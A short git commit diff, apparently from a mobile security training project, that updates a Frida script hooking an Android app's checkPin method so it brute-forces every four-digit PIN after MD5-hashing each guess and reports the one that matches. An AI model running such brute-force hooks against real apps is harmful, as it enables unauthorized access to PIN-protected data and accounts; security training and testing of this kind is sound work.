8e53f7a246994e23c8f4a3f00fc8a1bf2aeebd76
WaTF-Team <39304883+WaTF-Team@users.noreply.github.com>
2019-05-24 23:33:43 +0700

    Update Bypass-CheckPin-Brute.js

--- Frida-Scripts/Android/Bypass-CheckPin-Brute.js
+++ Frida-Scripts/Android/Bypass-CheckPin-Brute.js
@@ -4,9 +4,15 @@ Java.perform(function () {
 			console.log('Hook!!');
       	  		for(var i=0; i<9999; i++)
         		{
-            			this.checkPin(i+""); 
+				var x = this.md5(i+"")
+            			var result = this.checkPin(x); 
             			console.log("enter : "  + i); 
+				if (result) 
+				{
+					console.log("This is a pin!!!")
+					return true
+				}
         		}
-        	return true;
+		return false
     	}; 
 }); 
